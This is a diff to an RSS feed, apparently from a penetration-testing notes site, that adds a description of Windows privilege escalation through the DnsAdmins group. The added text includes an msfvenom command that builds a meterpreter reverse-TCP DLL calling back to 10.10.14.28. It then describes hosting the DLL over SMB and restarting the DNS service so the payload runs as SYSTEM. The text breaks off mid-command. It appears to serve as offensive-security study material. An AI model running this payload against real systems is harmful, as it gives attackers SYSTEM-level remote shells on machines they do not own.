@@ -64,7 +64,7 @@ Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound dat
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/dnsadmins_group/</guid>
-      <description>TODO</description>
+      <description># If you control any account member of the &amp;#34;DnsAdmin&amp;#34; group # You can use it to privesc on the machine # It works by adding a malicious DLL loaded by the DNS service. # You have to restart the service and the DLL will be loaded as SYSTEM# Generating the DLL $ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll &amp;gt; privesc.dll # Host the DLL on a SMD server or upload it on the target machine $ sudo smbserver.</description>
     </item>
     
   </channel>
